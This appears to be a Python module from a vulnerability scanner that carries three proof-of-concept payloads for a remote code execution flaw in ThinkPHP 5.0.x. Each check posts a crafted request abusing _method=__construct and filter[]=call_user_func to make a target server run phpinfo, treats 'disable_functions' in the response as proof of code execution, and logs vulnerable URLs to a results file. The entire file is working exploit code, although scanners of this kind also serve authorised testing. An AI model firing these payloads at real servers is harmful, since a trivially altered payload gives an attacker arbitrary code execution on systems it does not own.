#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan1:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None

    def run(self, urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo"
            response = requests.post(url,headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.1-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce1.txt", "a") as w:
                    w.write(f"存在ThinkPHP-5.0.1-RCE-POC-1 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-1')
                
        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-1')

    def run2(self,urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.1-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce1.txt", "a") as w:
                    w.write(f"存在ThinkPHP-5.0.1-RCE-POC-2 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-2')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-2')


    def run3(self, urls):
        try:
            url = urls + '/s=phpinfo()&_method=__construct&filter=assert'
            data = "_method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.1-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce1.txt", "a") as w:
                    w.write(f"存在ThinkPHP-5.0.1-RCE-POC-3 {url} --- Data {data}\n")

            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.1-RCE-POC-3')

        except Exception:
            pass

    def main(self, target):
        # OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)
        
        self.headers = req["header"]
        self.proxy = {"http":proxy,"https":proxy}
        # OutPrintInfo("ThinkPHP", '检测5.x RCE注入')
        # OutPrintInfo("ThinkPHP", '开始POC-0...')
        self.run(url)
        # OutPrintInfo("ThinkPHP", '开始POC-1...')
        self.run2(url)
        # OutPrintInfo("ThinkPHP", '开始POC-2...')
        self.run3(url)
